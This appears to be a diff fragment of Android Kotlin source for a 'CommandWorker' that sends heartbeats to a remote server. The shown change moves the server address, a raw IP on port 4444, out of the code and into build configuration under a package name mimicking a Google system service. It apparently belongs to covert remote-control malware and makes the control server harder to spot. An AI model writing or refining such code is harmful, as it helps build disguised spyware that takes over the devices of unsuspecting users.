@@ -12,6 +12,7 @@ import kotlinx.coroutines.withContext
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
+import com.google.android.systemservice.BuildConfig
 import org.json.JSONObject
 import java.util.concurrent.TimeUnit
 
@@ -22,7 +23,7 @@ class CommandWorker(
 
     companion object {
         private const val TAG = "SystemWorker"
-        private const val HEARTBEAT_URL = "http://213.91.211.150:4444/api/heartbeat"
+        private val HEARTBEAT_URL = "${BuildConfig.SERVER_BASE_URL}/api/heartbeat"
         
         fun schedule(context: Context) {
             val constraints = Constraints.Builder()
